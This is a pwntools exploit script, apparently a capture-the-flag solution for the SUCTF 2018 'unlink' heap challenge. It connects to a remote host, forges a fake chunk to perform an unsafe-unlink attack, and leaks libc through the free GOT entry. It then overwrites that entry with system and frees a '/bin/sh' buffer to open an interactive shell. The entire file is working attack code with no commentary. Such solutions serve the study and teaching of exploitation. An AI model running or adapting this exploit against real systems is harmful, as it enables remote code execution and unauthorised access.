from pwn import *
context(log_level='debug',arch='amd64',os='linux',terminal=['tmux','splitw','-h'])



# io=process("./[SUCTF 2018 招新赛]unlink")
io=remote("1.14.71.254",28457)
elf=ELF("./[SUCTF 2018 招新赛]unlink")
libc=ELF("./libc-2.23.so")

bss_addr=0x6020C0
free_got=elf.got[b"free"]

def add(n):
    io.sendlineafter(b"chooice :\n",b"1")
    io.recvuntil("size : \n")
    io.sendline(str(n))

def delete(n):
    io.sendlineafter(b"chooice :\n",b"2")
    io.recvuntil("delete\n")
    io.sendline(str(n))

def show(n):
    io.sendlineafter(b"chooice :\n",b"3")
    io.recvuntil("show\n")
    io.sendline(str(n))

def edit(n,cc):
    io.sendlineafter(b"chooice :\n",b"4")
    io.recvuntil(b"modify :")
    io.sendline(str(n))
    io.recvuntil(b"content\n")
    io.send(cc)


add(0x30) #0
add(0x80) #1
add(0x40) #2


fd=bss_addr-0x18
bk=bss_addr-0x10
payload=p64(0)+p64(0x30)+p64(fd)+p64(bk)+cyclic(0x10)
payload+=p64(0x30)+p64(0x90)

edit(0,payload)

# gdb.attach(io)
# pause()

delete(1) # 0<-1 unsorted bin 
edit(0,p64(0)*3+p64(free_got))
show(0)

libc_addr=u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))-libc.sym[b"free"]
print("libc_addr:  "+hex(libc_addr))


sys_addr=libc_addr+libc.sym[b"system"]
edit(0,p64(sys_addr))
edit(2,b"/bin/sh\x00")
delete(2)

io.interactive()